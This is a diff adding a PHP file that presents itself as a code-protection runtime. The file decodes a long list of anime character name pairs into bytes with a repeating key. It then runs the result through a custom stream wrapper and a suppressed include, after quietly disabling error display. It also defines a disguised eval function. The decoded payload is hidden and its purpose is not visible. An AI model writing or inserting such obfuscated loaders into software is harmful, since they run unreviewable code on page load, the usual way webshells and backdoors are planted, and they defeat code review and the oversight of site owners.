@@ -1,0 +1,69 @@
+<?php
+/*
+ * ====================================================
+ *  Sakura Code Protection Architecture v2.4
+ *  Encrypted & Secured Runtime Environment
+ * ====================================================
+ */
+$s='in'.'i_se'.'t';$s('display_errors','0');
+class HashiraStream{
+  private $pos=0;
+  public static $code="";
+  public function stream_open($path,$mode,$options,&$opened_path){$this->pos=0;return true;}
+  public function stream_read($count){
+    $ret=substr(self::$code,$this->pos,$count);
+    $this->pos+=strlen($ret);
+    return $ret;
+  }
+  public function stream_eof(){return $this->pos>=strlen(self::$code);}
+  public function stream_stat(){return [];}
+  public function stream_set_option($option,$arg1,$arg2){return true;}
+}
+$nichirin="sanemi-muichiro akaza-akaza akaza-akaza rengoku-obanai giyu-tengen zenitsu-mitsuri kokushibo-tengen shinobu-mitsuri tengen-akaza kanao-sanemi zenitsu-akaza tengen-mitsuri akaza-muichiro muzan-rengoku giyu-obanai giyu-muzan kanao-rengoku nezuko-muzan sanemi-inosuke sanemi-tengen zenitsu-akaza tengen-zenitsu akaza-inosuke rengoku-muzan giyu-sanemi rengoku-obanai kanao-shinobu shinobu-sanemi obanai-sanemi obanai-obanai obanai-sanemi muichiro-nezuko kokushibo-tanjiro muzan-obanai tanjiro-kanao rengoku-obanai mitsuri-kokushibo giyu-tengen kanao-kokushibo sanemi-muichiro inosuke-akaza tengen-mitsuri inosuke-sanemi giyu-nezuko sanemi-tengen inosuke-nezuko mitsuri-kanao zenitsu-shinobu obanai-nezuko sanemi-mitsuri zenitsu-obanai kanao-muichiro akaza-muichiro rengoku-sanemi giyu-kanao muzan-tengen kokushibo-sanemi tanjiro-muichiro sanemi-tanjiro tengen-nezuko inosuke-tengen tengen-zenitsu muzan-obanai zenitsu-obanai giyu-nezuko akaza-zenitsu obanai-shinobu giyu-tengen obanai-sanemi sanemi-nezuko zenitsu-sanemi tengen-muzan muzan-muzan rengoku-tengen shinobu-inosuke muzan-rengoku obanai-kanao shinobu-muichiro obanai-obanai tengen-tanjiro obanai-muzan kanao-muichiro akaza-mitsuri muzan-akaza giyu-muzan rengoku-muichiro obanai-tanjiro shinobu-rengoku obanai-giyu sanemi-muichiro obanai-muzan muzan-zenitsu giyu-nezuko akaza-nezuko sanemi-sanemi muzan-tanjiro mitsuri-sanemi zenitsu-shinobu mitsuri-obanai sanemi-mitsuri inosuke-zenitsu tengen-shinobu muzan-muzan rengoku-sanemi giyu-kokushibo muzan-rengoku obanai-tengen nezuko-tanjiro kokushibo-sanemi sanemi-mitsuri obanai-kokushibo akaza-giyu muzan-tengen muzan-tengen giyu-mitsuri muzan-kokushibo mitsuri-rengoku shinobu-tengen obanai-tanjiro sanemi-muichiro zenitsu-sanemi tengen-kokushibo akaza-muichiro zenitsu-obanai sanemi-sanemi muzan-tanjiro mitsuri-sanemi nezuko-giyu tengen-obanai mitsuri-mitsuri nezuko-zenitsu kokushibo-shinobu rengoku-muzan shinobu-rengoku zenitsu-sanemi rengoku-muichiro muichiro-kokushibo zenitsu-mitsuri muichiro-sanemi mitsuri-mitsuri nezuko-zenitsu kokushibo-muzan rengoku-muichiro shinobu-akaza nezuko-muichiro shinobu-tengen muichiro-kanao zenitsu-obanai muichiro-tanjiro mitsuri-kanao obanai-muichiro muzan-kanao giyu-nezuko giyu-nezuko inosuke-obanai akaza-zenitsu obanai-kokushibo shinobu-giyu mitsuri-kanao sanemi-tengen zenitsu-shinobu tengen-mitsuri akaza-muzan muzan-rengoku giyu-sanemi inosuke-shinobu kokushibo-tengen giyu-tengen obanai-inosuke tengen-giyu tanjiro-inosuke kokushibo-obanai rengoku-kanao shinobu-zenitsu zenitsu-kanao shinobu-mitsuri muichiro-tengen giyu-muzan muichiro-obanai mitsuri-tengen tanjiro-muichiro kanao-akaza rengoku-obanai giyu-tengen zenitsu-mitsuri shinobu-rengoku tengen-mitsuri giyu-nezuko muichiro-tengen muichiro-mitsuri tanjiro-shinobu kokushibo-tengen giyu-giyu inosuke-rengoku tanjiro-giyu giyu-akaza kokushibo-tengen shinobu-kanao tengen-akaza obanai-tengen inosuke-shinobu tengen-tengen akaza-giyu rengoku-shinobu giyu-tanjiro akaza-shinobu mitsuri-muichiro giyu-tengen kanao-inosuke kanao-muichiro zenitsu-inosuke tengen-nezuko giyu-nezuko giyu-nezuko inosuke-obanai akaza-zenitsu obanai-kokushibo shinobu-giyu mitsuri-kanao obanai-tengen zenitsu-muichiro tengen-akaza akaza-tengen rengoku-tengen tanjiro-inosuke inosuke-nezuko mitsuri-kanao shinobu-tanjiro kanao-giyu muichiro-inosuke zenitsu-kokushibo kanao-sanemi giyu-tanjiro zenitsu-kanao giyu-mitsuri inosuke-rengoku obanai-kokushibo giyu-mitsuri obanai-sanemi sanemi-mitsuri inosuke-zenitsu tengen-muzan inosuke-akaza zenitsu-kanao giyu-mitsuri giyu-akaza sanemi-giyu shinobu-nezuko obanai-nezuko tengen-tanjiro zenitsu-kokushibo tengen-muzan akaza-nezuko rengoku-shinobu giyu-zenitsu muzan-zenitsu obanai-tengen nezuko-tanjiro kanao-zenitsu obanai-kokushibo zenitsu-muichiro tengen-shinobu akaza-muzan muzan-mitsuri inosuke-kanao akaza-zenitsu obanai-kokushibo shinobu-giyu mitsuri-kanao obanai-obanai zenitsu-sanemi tengen-kokushibo muzan-mitsuri muzan-giyu tanjiro-zenitsu inosuke-rengoku kanao-tanjiro rengoku-inosuke kokushibo-sanemi sanemi-kanao sanemi-mitsuri akaza-kokushibo muzan-obanai rengoku-sanemi giyu-muzan muzan-zenitsu mitsuri-rengoku giyu-sanemi obanai-tanjiro sanemi-muichiro nezuko-sanemi kanao-muichiro akaza-muzan muzan-giyu giyu-sanemi muzan-zenitsu obanai-shinobu shinobu-muichiro obanai-obanai tengen-tanjiro obanai-giyu tengen-obanai giyu-nezuko giyu-nezuko giyu-giyu muzan-inosuke kokushibo-sanemi tanjiro-muichiro obanai-mitsuri tengen-nezuko inosuke-zenitsu kanao-obanai akaza-muichiro muzan-tengen giyu-mitsuri muzan-tengen kokushibo-muzan tanjiro-muichiro obanai-mitsuri muichiro-inosuke inosuke-mitsuri rengoku-mitsuri akaza-akaza giyu-inosuke giyu-tengen rengoku-obanai obanai-kokushibo shinobu-tengen obanai-tanjiro obanai-muzan inosuke-shinobu tengen-tengen akaza-giyu zenitsu-obanai sanemi-sanemi akaza-zenitsu kanao-tanjiro zenitsu-inosuke kokushibo-sanemi sanemi-tengen sanemi-mitsuri akaza-kokushibo muzan-obanai muzan-kokushibo giyu-kanao muzan-tanjiro obanai-zenitsu shinobu-muzan obanai-tengen obanai-mitsuri zenitsu-obanai muzan-nezuko giyu-tanjiro zenitsu-kanao giyu-tengen rengoku-akaza kokushibo-obanai shinobu-tengen mitsuri-obanai sanemi-tanjiro zenitsu-shinobu tengen-rengoku muzan-mitsuri zenitsu-mitsuri inosuke-akaza giyu-kanao tengen-giyu tanjiro-sanemi obanai-inosuke sanemi-muichiro inosuke-giyu tengen-kokushibo akaza-tengen zenitsu-mitsuri nezuko-kanao inosuke-giyu obanai-kanao shinobu-tengen obanai-muzan muichiro-zenitsu obanai-sanemi muzan-akaza inosuke-sanemi giyu-tanjiro tanjiro-zenitsu inosuke-giyu kanao-tanjiro nezuko-rengoku kokushibo-sanemi sanemi-akaza nezuko-tengen muzan-tanjiro akaza-tanjiro muzan-shinobu giyu-obanai akaza-nezuko kokushibo-obanai giyu-shinobu kanao-muzan tengen-tanjiro obanai-giyu tengen-kokushibo muzan-inosuke zenitsu-mitsuri giyu-obanai muzan-tanjiro mitsuri-sanemi giyu-mitsuri obanai-akaza obanai-mitsuri obanai-muzan kanao-rengoku shinobu-shinobu giyu-inosuke tanjiro-zenitsu muzan-shinobu obanai-tengen shinobu-muichiro obanai-tengen sanemi-tengen obanai-muzan akaza-akaza giyu-muichiro inosuke-kanao tanjiro-obanai giyu-muzan kanao-sanemi nezuko-akaza kanao-giyu tengen-giyu obanai-giyu kanao-obanai giyu-giyu zenitsu-kanao giyu-kokushibo inosuke-kokushibo kanao-muichiro nezuko-nezuko tengen-rengoku sanemi-nezuko zenitsu-rengoku muzan-nezuko inosuke-muichiro muzan-kokushibo tanjiro-giyu akaza-akaza mitsuri-mitsuri shinobu-sanemi obanai-mitsuri sanemi-nezuko inosuke-giyu kanao-obanai giyu-tanjiro zenitsu-kanao giyu-obanai inosuke-kokushibo kokushibo-kokushibo zenitsu-sanemi muichiro-tanjiro mitsuri-muichiro obanai-tanjiro rengoku-tengen giyu-rengoku zenitsu-obanai sanemi-sanemi muzan-mitsuri mitsuri-zenitsu tanjiro-sanemi obanai-tengen obanai-kokushibo inosuke-giyu tengen-nezuko inosuke-sanemi rengoku-inosuke nezuko-kanao giyu-muichiro kokushibo-obanai nezuko-muzan kanao-zenitsu tengen-nezuko obanai-obanai rengoku-tengen inosuke-akaza giyu-obanai zenitsu-sanemi rengoku-nezuko muichiro-muzan nezuko-muzan kanao-muichiro tengen-rengoku sanemi-nezuko kanao-shinobu akaza-kanao rengoku-zenitsu giyu-kokushibo shinobu-shinobu obanai-rengoku shinobu-tengen obanai-sanemi muichiro-zenitsu obanai-tanjiro rengoku-tengen giyu-rengoku zenitsu-kanao giyu-tengen rengoku-akaza kokushibo-obanai shinobu-tanjiro obanai-kanao sanemi-tengen inosuke-giyu muzan-tanjiro muzan-shinobu inosuke-giyu sanemi-mitsuri rengoku-kokushibo obanai-kokushibo giyu-giyu obanai-kokushibo muichiro-tengen zenitsu-sanemi tengen-muzan akaza-rengoku rengoku-tengen inosuke-obanai akaza-nezuko obanai-tanjiro shinobu-muzan obanai-kokushibo muichiro-zenitsu obanai-tanjiro akaza-muichiro akaza-giyu muzan-shinobu giyu-obanai muzan-zenitsu mitsuri-inosuke shinobu-kanao mitsuri-muzan sanemi-rengoku nezuko-muichiro tengen-tengen muzan-giyu muzan-giyu sanemi-mitsuri inosuke-rengoku tengen-zenitsu tanjiro-muichiro obanai-mitsuri muichiro-shinobu obanai-muzan muzan-tanjiro shinobu-inosuke muzan-mitsuri giyu-inosuke muzan-rengoku obanai-inosuke giyu-mitsuri kanao-inosuke kanao-kokushibo zenitsu-rengoku kanao-obanai akaza-muzan rengoku-muichiro tanjiro-inosuke inosuke-nezuko obanai-kanao nezuko-nezuko kanao-giyu tanjiro-inosuke obanai-giyu tengen-tengen giyu-rengoku giyu-inosuke giyu-nezuko muzan-giyu mitsuri-muichiro shinobu-muichiro obanai-obanai tengen-tanjiro obanai-giyu tengen-muichiro giyu-giyu inosuke-muzan tanjiro-tengen inosuke-sanemi kanao-tengen nezuko-nezuko tengen-rengoku tanjiro-shinobu zenitsu-rengoku kanao-muichiro akaza-giyu muzan-shinobu giyu-obanai muzan-zenitsu kokushibo-sanemi tanjiro-muichiro obanai-obanai tengen-nezuko sanemi-tengen tengen-tengen muzan-mitsuri muzan-kanao shinobu-tanjiro muzan-sanemi obanai-shinobu tanjiro-akaza obanai-obanai sanemi-mitsuri zenitsu-zenitsu tengen-muichiro akaza-muichiro muzan-akaza tanjiro-inosuke inosuke-nezuko obanai-kokushibo nezuko-giyu obanai-obanai sanemi-muichiro inosuke-zenitsu tengen-kokushibo akaza-muzan muzan-kokushibo tanjiro-inosuke inosuke-nezuko obanai-kokushibo nezuko-giyu kokushibo-mitsuri obanai-giyu inosuke-zenitsu kanao-shinobu akaza-rengoku rengoku-zenitsu giyu-mitsuri rengoku-kokushibo obanai-shinobu tanjiro-kanao kanao-giyu tengen-inosuke sanemi-giyu muzan-zenitsu shinobu-inosuke akaza-inosuke giyu-mitsuri muzan-zenitsu obanai-tengen shinobu-mitsuri obanai-mitsuri sanemi-rengoku obanai-tanjiro muzan-kokushibo shinobu-inosuke akaza-inosuke nezuko-rengoku zenitsu-mitsuri kokushibo-tengen shinobu-akaza tengen-akaza kanao-muichiro zenitsu-inosuke muzan-nezuko inosuke-muichiro muzan-tengen tanjiro-giyu giyu-akaza kokushibo-muzan shinobu-nezuko obanai-nezuko tengen-tanjiro obanai-giyu tengen-kokushibo giyu-nezuko akaza-nezuko giyu-obanai muzan-shinobu obanai-tanjiro shinobu-rengoku obanai-kanao obanai-kanao zenitsu-kokushibo kanao-akaza muzan-mitsuri muzan-muichiro inosuke-muichiro muzan-kokushibo kokushibo-sanemi tanjiro-sanemi tengen-kanao muichiro-rengoku obanai-muzan muzan-muzan inosuke-muichiro muzan-rengoku tanjiro-giyu giyu-akaza sanemi-giyu";
+$breathing=[192,73,24,6,219,13,119,232,123,136];
+$hashira_map=["tanjiro"=>0,"nezuko"=>1,"zenitsu"=>2,"inosuke"=>3,"giyu"=>4,"shinobu"=>5,"rengoku"=>6,"muzan"=>7,"akaza"=>8,"kokushibo"=>9,"kanao"=>10,"tengen"=>11,"muichiro"=>12,"mitsuri"=>13,"obanai"=>14,"sanemi"=>15];
+preg_match_all("/[a-z]+/i",$nichirin,$slayers);
+$slayers=$slayers[0];
+$dec_bytes=[];
+$rank=count($breathing);
+$slayers_count=count($slayers);
+for($i=0;$i<$slayers_count;$i+=2){
+  $water=$hashira_map[$slayers[$i]];
+  $fire=$hashira_map[$slayers[$i+1]];
+  $demon=($water<<4)|$fire;
+  $form=($i>>1)%$rank;
+  $dec_bytes[]=($demon-$breathing[$form]+256)%256;
+}
+$code=pack("C*",...$dec_bytes);
+$tokens=token_get_all($code);
+$code="";
+$file_path=__FILE__;
+$dir_path=dirname($file_path);
+foreach($tokens as $t){
+  if(is_array($t)){
+    $id=$t[0];$text=$t[1];
+    if($id===T_FILE){$code.="'".addslashes($file_path)."'";}
+    elseif($id===T_DIR){$code.="'".addslashes($dir_path)."'";}
+    else{$code.=$text;}
+  }else{$code.=$t;}
+}
+HashiraStream::$code=$code;
+stream_wrapper_register("nichirin","HashiraStream");
+if(!function_exists('shinobi_eval')){
+  function shinobi_eval($c){
+    if(substr(trim($c),0,2)==='?>'){$c=substr(trim($c),2);}
+    $c=preg_replace('/^\s*(\xEF\xBB\xBF)?<\?(php|=)?/i','<?$2',ltrim($c));
+    $t=token_get_all($c);$p="";$f=__FILE__;$d=dirname($f);
+    foreach($t as $x){
+      if(is_array($x)){
+        $id=$x[0];$text=$x[1];
+        if($id===T_FILE){$p.="'".addslashes($f)."'";}
+        elseif($id===T_DIR){$p.="'".addslashes($d)."'";}
+        else{$p.=$text;}
+      }else{$p.=$x;}
+    }
+    HashiraStream::$code=$p;
+    @include "nichirin://nested_exec";
+  }
+}
+@include "nichirin://exec";
